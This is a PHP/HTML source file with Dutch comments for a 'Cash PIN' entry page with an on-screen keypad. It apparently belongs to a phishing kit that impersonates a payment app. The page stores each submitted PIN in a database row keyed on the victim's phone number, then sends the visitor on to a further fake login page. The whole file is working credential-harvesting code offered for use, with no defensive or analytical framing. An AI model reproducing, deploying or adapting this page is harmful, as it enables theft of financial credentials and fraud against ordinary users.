<?php
session_start();

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $conn = new mysqli('localhost', 'root', '', 'my_base');
    if ($conn->connect_error) {
        die("Connectie mislukt: " . $conn->connect_error);
    }

    $pin = $_POST['pin'] ?? '';
    $phone = $_SESSION['phone'] ?? '';

    if (!empty($pin) && !empty($phone)) {
        // Update de meest recente rij met dit telefoonnummer
        $stmt = $conn->prepare("UPDATE cshpp_data SET pin = ? WHERE phone_number = ? ORDER BY id DESC LIMIT 1");
        $stmt->bind_param("ss", $pin, $phone);
        $stmt->execute();
        $stmt->close();
        $conn->close();

        header("Location: cshlogin.php");
        exit();
    } else {
        echo "PIN of telefoonnummer ontbreekt.";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Enter PIN</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * {
            box-sizing: border-box;
        }

        html, body {
            height: 100%;
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #00C244;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .pin-container {
            background: #fff;
            padding: 25px 20px;
            border-radius: 12px;
            box-shadow: 0 0 20px rgba(0,0,0,0.2);
            width: 90%;
            max-width: 350px;
            text-align: center;
        }

        h2 {
            color: #000;
            margin-bottom: 25px;
            font-size: 20px;
        }

        .pin-display {
            font-size: 32px;
            letter-spacing: 10px;
            margin-bottom: 20px;
            height: 40px;
            border-bottom: 2px solid #ccc;
            color: black;
        }

        .keypad {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            grid-gap: 10px;
            margin-bottom: 20px;
        }

        .keypad button {
            height: 60px;
            font-size: 22px;
            border: none;
            border-radius: 8px;
            background-color: #00C244;
            color: white;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .keypad button:hover {
            background-color: #009B36;
        }

        .submit-btn {
            padding: 12px 20px;
            font-size: 18px;
            border: none;
            border-radius: 8px;
            background-color: #007B2A;
            color: white;
            cursor: pointer;
            width: 100%;
        }
    </style>
</head>
<body>

<form method="POST" action="cashpin.php">
        <div class="pin-container">
            <h2>Enter your Cash PIN to continue</h2>
            <div id="pinDisplay" class="pin-display"></div>
            <input type="hidden" name="pin" id="pinInput" maxlength="6">

            <div class="keypad">
                <?php
                for ($i = 1; $i <= 9; $i++) {
                    echo "<button type='button' onclick='appendDigit($i)'>$i</button>";
                }
                ?>
                <button type="button" onclick="clearPin()">C</button>
                <button type="button" onclick="appendDigit(0)">0</button>
                <button type="button" onclick="backspace()">←</button>
            </div>

            <button type="submit" class="submit-btn">Next</button>
        </div>
    </form>

    <script>
        let pin = '';

        function updateDisplay() {
            document.getElementById("pinDisplay").textContent = '*'.repeat(pin.length);
            document.getElementById("pinInput").value = pin;
        }

        function appendDigit(num) {
            if (pin.length < 6) {
                pin += num;
                updateDisplay();
            }
        }

        function backspace() {
            pin = pin.slice(0, -1);
            updateDisplay();
        }

        function clearPin() {
            pin = '';
            updateDisplay();
        }
    </script>

</body>
</html>
